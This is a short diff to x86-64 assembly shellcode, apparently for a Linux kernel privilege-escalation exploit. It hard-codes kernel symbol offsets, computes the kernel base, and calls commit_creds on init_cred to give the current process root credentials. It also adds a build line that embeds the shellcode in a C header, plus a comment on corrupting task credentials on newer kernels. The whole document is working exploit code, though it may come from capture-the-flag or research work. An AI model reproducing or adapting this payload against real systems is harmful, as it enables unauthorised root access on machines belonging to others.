@@ -1,3 +1,4 @@
+; nasm -f bin ./shellcode.S && xxd -i shellcode > shellcode.h 
 BITS 64
   commit_creds  equ 0x1097210
   init_cred     equ 0x1e39080
@@ -11,7 +12,9 @@ a:
   pop r15
   sub r15, 0x11bbe19
 
-  ; commit_creds(prepare_kernel_cred(NULL));
+  ; commit_creds(init_cred);
+  ; doesn't work with newer version try to corrupt
+  ; current task creds instead
   lea rdi, [r15 + init_cred]
   lea rax, [r15 + commit_creds]
   call rax
